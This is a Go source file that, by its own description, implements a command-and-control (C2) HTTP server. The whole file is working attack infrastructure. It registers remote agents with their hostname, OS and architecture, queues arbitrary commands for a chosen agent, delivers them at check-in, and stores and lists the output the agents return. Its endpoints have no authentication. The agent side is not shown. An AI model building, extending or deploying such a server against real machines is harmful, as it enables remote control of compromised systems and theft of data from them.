// Package server implements the C2 HTTP server that manages agents and commands.
package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/lsanarchist/c2/pkg/protocol"
)

// Agent holds runtime state for a connected agent.
type Agent struct {
	ID        string
	Hostname  string
	OS        string
	Arch      string
	LastSeen  time.Time
	CommandID string // pending command ID
	Command   string // pending command text
}

// Server is the C2 HTTP server.
type Server struct {
	mu      sync.Mutex
	agents  map[string]*Agent
	results []protocol.Result
	mux     *http.ServeMux
}

// New creates and initialises a new Server.
func New() *Server {
	s := &Server{
		agents: make(map[string]*Agent),
		mux:    http.NewServeMux(),
	}
	s.mux.HandleFunc("/checkin", s.handleCheckIn)
	s.mux.HandleFunc("/result", s.handleResult)
	s.mux.HandleFunc("/agents", s.handleListAgents)
	s.mux.HandleFunc("/command", s.handleSendCommand)
	s.mux.HandleFunc("/results", s.handleListResults)
	return s
}

// Handler returns the HTTP handler for the server, useful for testing.
func (s *Server) Handler() http.Handler {
	return s.mux
}

// ListenAndServe starts the HTTP server on addr.
func (s *Server) ListenAndServe(addr string) error {
	log.Printf("[server] listening on %s", addr)
	return http.ListenAndServe(addr, s.mux)
}

// handleCheckIn registers or updates an agent and returns any pending command.
func (s *Server) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var ci protocol.CheckIn
	if err := json.NewDecoder(r.Body).Decode(&ci); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	a, exists := s.agents[ci.ID]
	if !exists {
		a = &Agent{ID: ci.ID}
		s.agents[ci.ID] = a
		log.Printf("[server] new agent: %s (%s/%s) on %s", ci.ID, ci.OS, ci.Arch, ci.Hostname)
	}
	a.Hostname = ci.Hostname
	a.OS = ci.OS
	a.Arch = ci.Arch
	a.LastSeen = time.Now()

	resp := protocol.CheckInResponse{
		CommandID: a.CommandID,
		Command:   a.Command,
	}
	// Clear the pending command once dispatched.
	a.CommandID = ""
	a.Command = ""
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(resp); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}

// handleResult stores the result received from an agent.
func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var res protocol.Result
	if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	s.results = append(s.results, res)
	s.mu.Unlock()

	log.Printf("[server] result from %s (cmd %s): %s", res.AgentID, res.CommandID, res.Output)
	w.WriteHeader(http.StatusNoContent)
}

// handleListAgents returns a JSON list of all known agents.
func (s *Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	s.mu.Lock()
	agents := make([]*Agent, 0, len(s.agents))
	for _, a := range s.agents {
		agents = append(agents, a)
	}
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(agents); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}

// handleSendCommand queues a command for a specific agent.
// Expected query params: agent_id, command_id, command.
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := r.URL.Query().Get("agent_id")
	commandID := r.URL.Query().Get("command_id")
	command := r.URL.Query().Get("command")

	if agentID == "" || commandID == "" || command == "" {
		http.Error(w, "agent_id, command_id and command are required", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	a, ok := s.agents[agentID]
	if !ok {
		s.mu.Unlock()
		http.Error(w, fmt.Sprintf("agent %s not found", agentID), http.StatusNotFound)
		return
	}
	a.CommandID = commandID
	a.Command = command
	s.mu.Unlock()

	log.Printf("[server] queued command %s for agent %s: %s", commandID, agentID, command)
	w.WriteHeader(http.StatusNoContent)
}

// handleListResults returns all stored results as JSON.
func (s *Server) handleListResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	s.mu.Lock()
	results := make([]protocol.Result, len(s.results))
	copy(results, s.results)
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(results); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}
